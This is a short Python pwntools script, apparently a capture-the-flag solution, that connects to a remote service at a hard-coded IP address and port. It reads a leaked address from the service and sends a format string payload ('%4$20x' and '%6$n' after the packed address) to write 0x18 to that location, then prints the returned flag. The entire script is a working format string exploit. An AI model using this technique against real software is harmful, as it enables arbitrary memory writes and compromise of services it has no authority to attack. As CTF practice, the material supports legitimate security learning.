from pwn import *
#Goal: Write 0x18 to write_location using format string attack
flag = remote('18.222.213.102', 12345)
#Where we want to write to
flag.recvuntil('0x')
write_location = int("0x" + flag.recv(8), 16)
#note: buffer is 24 bytes long
payload = ""
payload += p32(write_location)
payload += "%4$20x"
payload += "%6$n"

log.info("payload = %s" % repr(payload))

flag.sendline(payload)
print(flag.recvuntil('}')) #To catch the end of the flag
